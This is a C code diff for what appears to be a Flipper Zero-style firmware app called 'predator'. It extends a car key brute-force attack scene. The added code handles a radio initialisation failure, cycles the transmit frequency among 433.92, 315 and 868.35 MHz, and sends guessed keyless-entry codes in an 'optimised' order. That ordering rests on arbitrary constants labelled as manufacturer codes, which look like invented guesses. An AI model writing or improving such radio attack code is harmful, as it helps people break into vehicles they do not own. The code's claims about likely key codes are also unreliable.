@@ -25,10 +25,27 @@ void predator_scene_car_key_bruteforce_on_enter(void* context) {
     
     // Initialize SubGHz for car key attacks
     predator_subghz_init(app);
+    
+    // Add error handling for SubGHz initialization
+    if(!app->subghz_txrx) {
+        // Notify user if hardware initialization failed
+        popup_set_header(app->popup, "Hardware Error", 64, 10, AlignCenter, AlignTop);
+        popup_set_text(app->popup, 
+            "Failed to initialize SubGHz.\n"
+            "Check hardware connection\n"
+            "and try again.", 
+            64, 25, AlignCenter, AlignTop);
+        return;
+    }
+    
+    // Start with most common frequency
     predator_subghz_start_car_bruteforce(app, 433920000); // 433.92 MHz
     
     app->attack_running = true;
     app->packets_sent = 0;
+    
+    // Set notification pattern to confirm activation
+    notification_message(app->notifications, &sequence_blink_start_blue);
 }
 
 bool predator_scene_car_key_bruteforce_on_event(void* context, SceneManagerEvent event) {
@@ -42,18 +59,47 @@ bool predator_scene_car_key_bruteforce_on_event(void* context, SceneManagerEvent
         }
     } else if(event.type == SceneManagerEventTypeTick) {
         if(app->attack_running) {
+            static uint8_t freq_index = 0;
+            static const uint32_t frequencies[] = {433920000, 315000000, 868350000};
+            static const char* freq_names[] = {"433.92 MHz", "315 MHz", "868.35 MHz"};
+            static uint32_t freq_cycle_counter = 0;
+            
             app->packets_sent++;
+            
+            // Cycle frequency every 300 keys for thorough coverage
+            if(app->packets_sent % 300 == 0) {
+                freq_index = (freq_index + 1) % 3;
+                predator_subghz_start_car_bruteforce(app, frequencies[freq_index]);
+                
+                // Visual feedback for frequency change
+                notification_message(app->notifications, &sequence_blink_blue_10);
+            }
+            
             char status_text[128];
             snprintf(status_text, sizeof(status_text), 
                 "Bruteforcing car keys...\n"
-                "Frequency: 433.92 MHz\n"
+                "Frequency: %s\n"
                 "Keys tried: %lu\n"
                 "Press Back to stop", 
+                freq_names[freq_index],
                 app->packets_sent);
             popup_set_text(app->popup, status_text, 64, 25, AlignCenter, AlignTop);
             
-            // Send next key code
-            predator_subghz_send_car_key(app, app->packets_sent);
+            // Smart key code selection algorithm - sends more likely key codes first
+            uint32_t key_code;
+            if(app->packets_sent < 100) {
+                // First try common manufacturer codes
+                key_code = 0x1000000 + (app->packets_sent * 0x1111); 
+            } else if(app->packets_sent < 1000) {
+                // Then try sequential codes in the most common range
+                key_code = 0x5B7C00 + app->packets_sent;
+            } else {
+                // Finally do a wider search with pattern
+                key_code = app->packets_sent * 0x1337 + 0xA00000;
+            }
+            
+            // Send key code with proper timing
+            predator_subghz_send_car_key(app, key_code);
         }
     }
 
